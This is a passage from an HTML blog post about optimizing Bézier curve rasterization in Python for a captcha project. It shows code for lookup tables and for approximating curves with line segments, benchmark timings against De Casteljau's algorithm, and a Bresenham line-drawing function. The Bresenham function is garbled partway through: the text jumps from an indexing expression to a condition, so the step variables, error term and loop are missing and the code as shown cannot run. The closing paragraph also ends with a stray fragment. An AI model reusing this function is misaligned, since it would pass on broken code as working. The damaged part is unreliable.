        <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">p3</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">p4</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">p3</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">p4</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_plot_pixel</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</pre></div>


<p>.<br />
And here you see the performance results:  </p>
<p><code>[+] Testing task is to draw 500 randomly generated Bézier splines with different algorithms. Approximation uses 20 segments. [!] Testing quadratic bezier curves with direct approach - elapsed time: 2320.041656 ms [!] Testing cubic bezier curves with direct approach - elapsed time: 2830.367804 ms [!] Testing quadratic bezier curves with lookup tables - elapsed time: 1840.610504 ms [!] Testing cubic bezier curves with lookup tables - elapsed time: 2220.727682 ms</code><br />
This means we get another 30% performance boost (quadratic and
cubic computations scale linearly percent wise)! Honestly, I
expected more of using look-up tables. Please leave a comment in
case I implemented them wrong.</p>
</li>
<li>
<p><em>Approximate</em> Why even calculating 1000 Points? Usually you can't
    even appreciate the smoothness of such a curve, because the splines
    are just not big enough in the end (For instance in the final
    captcha), performance however is always good to have ;) That being
    said, I will proceed as follows: Instead of iterating 1000 times, I
    will simply iterate 15 times and thus evaluate the Bézier equation
    only 15 times. Then I will just connect these 15 points with
    straight lines. Let's see how fast all the previous techniques and
    this combined will make the algorithm (Note that the precalculating
    trick and the approximation intersect performance wise, because now
    the look-up table is not anywhere as useful as before, since we
    evaluate the equation only 15 times). Here's the updated code
    together with the final performance results. First the approximation
    code:</p>
<div class="highlight"><pre><span class="k">def</span> <span class="nf">_approx_quadratic_bez</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span><span class="p">):</span>
    <span class="n">lp</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">lp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_NUM_SEGMENTS</span><span class="p">):</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">i</span> <span class="o">/</span> <span class="bp">self</span><span class="o">.</span><span class="n">_NUM_SEGMENTS</span>
        <span class="n">t2</span> <span class="o">=</span> <span class="n">t</span><span class="o">*</span><span class="n">t</span>
        <span class="n">mt</span> <span class="o">=</span> <span class="mi">1</span><span class="o">-</span><span class="n">t</span>
        <span class="n">mt2</span> <span class="o">=</span> <span class="n">mt</span><span class="o">*</span><span class="n">mt</span>
        <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">mt2</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="mi">2</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t</span> <span class="o">+</span> <span class="n">p3</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">t2</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">mt2</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="mi">2</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t</span> <span class="o">+</span> <span class="n">p3</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">t2</span><span class="p">)</span>
        <span class="n">lp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">Point</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">))</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lp</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">line</span><span class="p">([</span><span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]])</span>

<span class="k">def</span> <span class="nf">_approx_cubic_bez</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span><span class="p">,</span> <span class="n">p4</span><span class="p">):</span>
    <span class="n">lp</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">lp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_NUM_SEGMENTS</span><span class="p">):</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">i</span> <span class="o">/</span> <span class="bp">self</span><span class="o">.</span><span class="n">_NUM_SEGMENTS</span>
        <span class="n">t2</span> <span class="o">=</span> <span class="n">t</span> <span class="o">*</span> <span class="n">t</span>
        <span class="n">t3</span> <span class="o">=</span> <span class="n">t2</span> <span class="o">*</span> <span class="n">t</span>
        <span class="n">mt</span> <span class="o">=</span> <span class="mi">1</span><span class="o">-</span><span class="n">t</span>
        <span class="n">mt2</span> <span class="o">=</span> <span class="n">mt</span> <span class="o">*</span> <span class="n">mt</span>
        <span class="n">mt3</span> <span class="o">=</span> <span class="n">mt2</span> <span class="o">*</span> <span class="n">mt</span>
        <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">mt3</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">p2</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">mt2</span><span class="o">*</span><span class="n">t</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">p3</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t2</span> <span class="o">+</span> <span class="n">p4</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">t3</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">mt3</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">p2</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">mt2</span><span class="o">*</span><span class="n">t</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">p3</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t2</span> <span class="o">+</span> <span class="n">p4</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">t3</span><span class="p">)</span>
        <span class="n">lp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">Point</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">))</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lp</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">line</span><span class="p">([</span><span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]])</span>
</pre></div>


<p>And now all performance results together:  </p>
<p><code>[+] Testing task is to draw 500 randomly generated Bézier splines with different algorithms. Approximation uses 20 segments. [!] Testing quadratic bezier curves with De Casteljaus algorithm - elapsed time: 7362.981081 ms [!] Testing cubic bezier curves with De Casteljaus algorithm - elapsed time: 11826.589823 ms [!] Testing unoptimized quadratic bezier with direct approach - elapsed time: 2533.061028 ms [!] Testing unoptimized cubic curves with direct approach - elapsed time: 3126.898527 ms [!] Testing quadratic bezier curves with direct approach - elapsed time: 2231.390953 ms [!] Testing cubic bezier curves with direct approach - elapsed time: 2773.490906 ms [!] Testing quadratic bezier curves with lookup tables - elapsed time: 1845.245123 ms [!] Testing cubic bezier curves with lookup tables - elapsed time: 2269.758940 ms [!] Testing quadratic bezier curves with approximation - elapsed time: 252.831936 ms [!] Testing cubic bezier curves with approximation - elapsed time: 286.973476 ms</code><br />
BOOM! The approximation needs stunning 287 milliseconds to plot 500
random cubic Bézier splines, whereas De Casteljaus algorithm takes
12 Seconds! That's 42 times faster! You say the approximation looks
ugly? Maybe your right, but for my purposes it's certainly enough.
Here's a picture of a spline plotted with the approximation method
(on the left) and De Casteljau's algorithm (on the right). In my
opinion there is no big difference (From this perspective, and for
the captcha purposes it is really enough resolution).<br />
[<img alt="Comparison" src="/uploads/2013/10/approx_vs_castel-1024x576.png" />
Both splines are identical. On the left is the curve approximated
(fast) and on the right drawn with De Casteljau's algorithm
(slow).</p>
<p>[<img alt="Comparison of De Casteljau's algorithm and the
approximative
method," src="/uploads/2013/10/approx_vs_casteljau2-1024x576.png" /></p>
<p>Both splines are exactly the same. On the left is the curve
approximated by lines (fast) and on the right drawn with De
Casteljau's algorithm (slow).</p>
</li>
</ul>
<h3>Conclusion</h3>
<p>We saw some performance boosting techniques. From initial 7,3 seconds
with De Casteljaus algorithm (plotting 500 quadratic splines) , we made
it down to 0.252 seconds! That's around 40 times faster. Of course we
could be better, but let's stop here!</p>
<h3>Drawing Lines</h3>
<p>That's almost it! We also need a algorithm for plotting staright lines.
Maybe you think that's a trivial task, but not so fast my dear. There's
actually <a href="http://en.wikipedia.org/wiki/Bresenham's_line_algorithm">quite a bit of
math</a> behind
simple even lines! I adopted the algorithm from <a href="http://members.chello.at/easyfilter/bresenham.html">this
site</a>, which offers
also a 100 page strong essay about plotting geometrical primitives. The
text is quite hard to understand if you don't possess profound
mathematical knowledge, but it's still worth a glimpse!</p>
<p>However, this is the line plotting algorithm:</p>
<div class="highlight"><pre><span class="c"># Yet another implementation taken from</span>
<span class="c"># http://members.chello.at/easyfilter/bresenham.html</span>
<span class="c"># This alogrithm is capable to plot all possible lines in a 2d plane.</span>
<span class="k">def</span> <span class="nf">line</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">points</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span> <span class="ow">or</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">points</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">tuple</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">InvalidInputError</span><span class="p">(</span><span class="s">&#39;To draw a line we need a list of two tuples containing two ints&#39;</span><span class="p">)</span>

    <span class="p">(</span><span class="n">x0</span><span class="p">,</span> <span class="n">y0</span><span class="p">),</span> <span class="p">(</span><span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">)</span> <span class="o">=</span> <span class="n">points</span>

    <span class="n">dx</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">x1</span><span class="o">-</span><span class="n">x0</span><span class="p">)</span>
    <span class="n">dy</span> <span class="o">=</span> <span class="o">-</span><span class="nb">abs</span><span class="p">(</span><span class="n">y1</span><span class="o">-</span><span class="n">y0</span><span class="p">)</span>
    <span class="n">sx</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">][</span><span class="n">x0</span><span class="o">=</span> <span class="n">dy</span><span class="p">):</span>
            <span class="n">err</span> <span class="o">+=</span> <span class="n">dy</span>
            <span class="n">x0</span> <span class="o">+=</span> <span class="n">sx</span>     
        <span class="k">if</span> <span class="p">(</span><span class="n">e2</span> <span class="o">&lt;=</span> <span class="n">dx</span><span class="p">):</span>
            <span class="n">err</span> <span class="o">+=</span> <span class="n">dx</span>
            <span class="n">y0</span> <span class="o">+=</span> <span class="n">sy</span>
</pre></div>


<p>I have shown you some rasterization algorithms and now I am ready to use
them to draw my font. In the next article, I will use this code! So stay
tuned and send me a letter for Christmas!
s!</p>
  </div>
</article>

  <div class="pagination">
    <a class="btn" href="/index5.html">
      <i class="fa fa-angle-left"></i> Older Posts
    </a>
      <a class="btn float-right" href="/index3.html">
        Newer Posts <i class="fa fa-angle-right"></i>
      </a>
  </div>

    <footer>
      <p>&copy; Nikolai Tschacher 2015</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p>    </footer>
  </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Coding, Learning and IT Security ",
  "url" : "",
  "image": "",
  "description": "Nikolai Tschacher's ideas and programming around security and computer science"
}
</script></body>
</html>